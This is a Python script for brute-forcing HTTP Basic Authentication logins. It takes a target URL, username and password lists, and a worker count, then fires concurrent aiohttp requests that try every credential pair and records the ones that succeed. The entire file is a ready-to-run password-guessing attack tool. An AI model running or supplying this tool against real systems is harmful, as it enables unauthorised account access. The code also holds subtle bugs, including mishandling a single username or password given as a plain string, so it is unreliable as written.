import itertools
import asyncio
import aiohttp
import logging

from pathlib import Path

log = logging.basicConfig(format='http_basic 🠖 %(message)s', level=logging.INFO)


class BasicAuth:

    def __init__(self, url, user_list, pass_list, workers):
        self.url = url
        self.users = self._return_str_or_list(user_list)
        self.passwords = self._return_str_or_list(pass_list)
        self.workers = int(workers)
        self.queue = None
        self.found = []

    @staticmethod
    def _return_str_or_list(item):
        if not item:
            return None
        stub = []
        config = Path(item)
        if config.is_file():
            for x in open(item):
                stub.append(x.rstrip())
            return stub
        else:
            return str(item)

    async def worker(self, queue):
        while True:
            stub = await queue.get()
            auth = aiohttp.BasicAuth(login=stub[0], password=stub[1])
            async with aiohttp.ClientSession() as session:
                async with session.get(self.url, auth=auth) as resp:
                    if resp.status == 200:
                        logging.info(f"Login Found: {auth[0]} {auth[1]}")
                        self.found.append(auth)
                    if resp.status == 401:
                        pass
                    if resp.status == 403:
                        logging.warning("Target may be blocking attempt(s)")
            queue.task_done()

    async def main(self):
        queue = asyncio.Queue()
        for u, p in itertools.product(self.users, self.passwords):
            queue.put_nowait((u, p))

        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self.worker(queue))
            tasks.append(task)

        await queue.join()

        for task in tasks:
            task.cancel()


def usage():
    u = """
    USAGE:
      {} -h "http://127.0.0.1" -u "admin" -p /tmp/passwords.txt
      {} -h "http://127.0.0.1" -u /tmp/users.txt -p /tmp/passwords.txt
      {} -h "http://127.0.0.1" -u /tmp/users.txt -p /tmp/passwords.txt -w 20

    OPTIONS:
      '-h', '--host'       - Set the URL target with Basic Auth login form.
      '-u', '--users'      - Set the username or path to file containing users.
      '-p', '--passwords'  - Set the password or path to file containing passwords.
      '-w', '--workers'    - Set the number of workers to run during attempts.

    """
    print(u)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(add_help=False, usage=usage)
    parser.add_argument('-h', '--host', action='store', dest='host', default='')
    parser.add_argument('-u', '--users', action='store', dest='users', default='')
    parser.add_argument('-p', '--passwords', action='store', dest='passwords', default='')
    parser.add_argument('-w', '--workers', action='store', dest='workers', default='')
    arg = None

    try:
        arg = parser.parse_args()
    except TypeError:
        usage()
        exit("Invalid options provided. Exiting.")

    if not arg.host or not arg.users or not arg.passwords:
        usage()
        exit("Required options not provided. Exiting.")

    if not arg.workers:
        arg.workers = 10

    print("Starting Authentication Bruteforce\n--")
    print(f"[Target URL]: {arg.host}")
    print(f"[Workers Initiated]: {arg.workers}\n")

    obj = BasicAuth(arg.host, arg.users, arg.passwords, arg.workers)
    asyncio.run(obj.main())
